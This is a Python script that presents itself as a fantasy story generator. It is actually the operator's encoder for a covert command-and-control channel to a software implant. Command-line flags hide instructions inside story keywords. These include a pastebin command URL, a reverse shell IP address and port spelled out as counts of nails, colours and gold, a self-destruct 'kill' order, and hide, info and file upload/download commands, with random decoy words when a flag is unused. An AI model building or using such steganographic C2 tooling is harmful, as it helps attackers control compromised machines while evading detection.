#!/usr/bin/python3
import os
import random
import string
import argparse

# Get location of the pyscript
__location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))

# Location of the stories folder
_STORY_FOLDER = os.path.join(__location__, "./stories")

# Story word lists
_MARKETPLACE_ALTERNATIVES = ["bazaar", "market", "market square", "shoppe street"]
_BREAD = ["anpan", "bagel", "biscotti", "croissant", "flatbread", "miche", "penia"]
_SCARY_ADJ = ["ugly", "mean", "angry", "grumpy", "filthy", "grumbly", "large"]
_CREATURE = [
    "orc",
    "troll",
    "dwarf",
    "halfling",
    "ogre",
    "elf",
    "pigman",
    "sentient tuba",
]
_BLACKSMITH = [
    "Rod'vir",
    "Michael Jackson",
    "Johnnnnnnnnn",
    "Me'dal Workor",
    "Blak Smith",
    "Jamal",
]
_BLACKSMITH_GOODS = ["Nails", "horseshoes", "screws", "Hammers", "knives"]
_BAKER = ["Ba'kir", "Linda", "Hinderoa", "Slippy", "Eustaus"]
_COLOR_MACRO = ["crimson", "blood-red", "black", "silver", "luminescent"]
_SHELL_SETTING = [
    "forest",
    "river",
    "lake",
    "ocean-ridge",
]
_CHAR_ADJ_LIST = [
    "brave",
    "strong",
    "pretty",
    "handsome",
    "friendly",
    "courageous",
    "bubbly",
    "happy",
    "lucky",
]


def main():
    # Build and parse args
    parser = argparse.ArgumentParser(
        description="Generates the story text based on a template in ./stories/story.txt"
    )

    parser.add_argument(
        "-name",
        type=str,
        default=None,
        help="Name of the character",
        dest="character",
        required=True,
    )
    parser.add_argument(
        "-pb",
        type=str,
        default=None,
        help="Location of the pastebin URL for a CMD",
        dest="pastebin",
        required=False,
    )
    parser.add_argument(
        "-shell",
        type=str,
        default=None,
        help="Location of the reverse shell connection. EG: 128.0.2.52:1283",
        required=False,
    )
    parser.add_argument(
        "-kill",
        help="Will issue the kill command, which will cause self destruction of the implant",
        action="store_true",
    )
    parser.add_argument(
        "-info", help="Will issue the info macro command", action="store_true"
    )
    parser.add_argument(
        "-hide", help="Will issue the hide command", action="store_true"
    )
    parser.add_argument(
        "-file", type=str, help="Will issue the download/upload command, files to be downloaded/uploaded in pb"
    )

    args = parser.parse_args()


    ### Building the story
    with open(os.path.join(_STORY_FOLDER, "story.txt"), "r") as f:
        story = f.read()

    ## Defaults
    # Replace Character and pronouns
    story = story.replace("[CHARACTER]", args.character)
    with open(os.path.join(_STORY_FOLDER, "male-names.txt"), "r") as male_list:
        if args.character.lower() in male_list.read():
            story = story.replace("[THEY]", "He")
            story = story.replace("[THEIR]", "His")
        else:
            story = story.replace("[THEY]", "She")
            story = story.replace("[THEIR]", "Her")
    # Replace
    while "[SCARY-ADJ]" in story:
        story = story.replace("[SCARY-ADJ]", random.choice(_SCARY_ADJ), 1)
    while "[CREATURE]" in story:
        story = story.replace("[CREATURE]", random.choice(_CREATURE), 1)
    story = story.replace(
        "[CHAR-ADJ-LIST]",
        random.choice(_CHAR_ADJ_LIST)
        + ", "
        + random.choice(_CHAR_ADJ_LIST)
        + ", and "
        + random.choice(_CHAR_ADJ_LIST),
    )
    story = story.replace(
        "[SHELL-HERRING]",
        str(random.randint(1, 300))
        + " "
        + random.choice(_COLOR_MACRO)
        + " and "
        + str(random.randint(1, 500))
        + " "
        + random.choice(_COLOR_MACRO),
    )

    ## Potential Args
    # Handle CMD Setting
    if args.pastebin:
        # Keyword
        story = story.replace("[CMDSETTING]", "marketplace")
        # Location Indicators
        story = story.replace(
            "[INCANT]",
            "".join(
                random.choice(
                    string.ascii_uppercase + string.ascii_lowercase + string.digits
                )
                for _ in range(5)
            )
            + args.pastebin
            + "".join(
                random.choice(
                    string.ascii_uppercase + string.ascii_lowercase + string.digits
                )
                for _ in range(7)
            ),
        )
    else:
        # Keyword
        story = story.replace("[CMDSETTING]", random.choice(_MARKETPLACE_ALTERNATIVES))
        # Location Indicators
        story = story.replace(
            "[INCANT]",
            "".join(
                random.choice(
                    string.ascii_uppercase + string.ascii_lowercase + string.digits
                )
                for _ in range(random.randint(13, 20))
            ),
        )
    # Handle Shell
    if args.shell:
        # Keyword
        story = story.replace("[SHELLSETTING]", "beach")
        # Locations
        # Parsing/Setting
        parsed = args.shell.split(":")
        story = story.replace("[GOLD]", parsed[-1])
        parsed = parsed[0].split(".")
        story = story.replace(
            "[SHELL-LOCATOR-1]",
            parsed[0]
            + " "
            + random.choice(_BLACKSMITH_GOODS)
            + " and "
            + parsed[2]
            + " "
            + random.choice(_BLACKSMITH_GOODS),
        )
        story = story.replace(
            "[SHELL-LOCATOR-2]",
            parsed[3]
            + " "
            + random.choice(_COLOR_MACRO)
            + " and "
            + parsed[1]
            + " "
            + random.choice(_COLOR_MACRO),
        )
    else:
        # Keyword
        story = story.replace("[SHELLSETTING]", random.choice(_SHELL_SETTING))
        # Locations
        story = story.replace("[GOLD]", str(random.randint(1, 3000)))
        story = story.replace(
            "[SHELL-LOCATOR-1]",
            str(random.randint(1, 400))
            + " "
            + random.choice(_BLACKSMITH_GOODS)
            + " and "
            + str(random.randint(1, 250))
            + " "
            + random.choice(_BLACKSMITH_GOODS),
        )
        story = story.replace(
            "[SHELL-LOCATOR-2]",
            str(random.randint(1, 300))
            + " "
            + random.choice(_COLOR_MACRO)
            + " and "
            + str(random.randint(1, 500))
            + " "
            + random.choice(_COLOR_MACRO),
        )
    # Handle kill keyword
    if args.kill:
        # Keyword
        story = story.replace("[KILL-BREAD]", "french-bread")
    else:
        story = story.replace("[KILL-BREAD]", random.choice(_BREAD))
    # Handle Info Macro
    if args.info:
        story = story.replace("[COLOR-MACRO]", "scarlet")
    else:
        story = story.replace("[COLOR-MACRO]", random.choice(_COLOR_MACRO))
    # Handle hide
    if args.hide:
        story = story.replace("[BAKER]", "Hilda")
    else:
        story = story.replace("[BAKER]", random.choice(_BAKER))
    if args.file:
        story = story.replace("[BLACKSMITH]", "Max Ter'Forg'r")
        # Location
        story = story.replace("[INCANT2]",args.file)
    else:
        story = story.replace("[BLACKSMITH]", random.choice(_BLACKSMITH))
        #Location
        story = story.replace("[INCANT2]", "".join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits)for _ in range(8)))

    print(story)


if __name__ == "__main__":
    main()
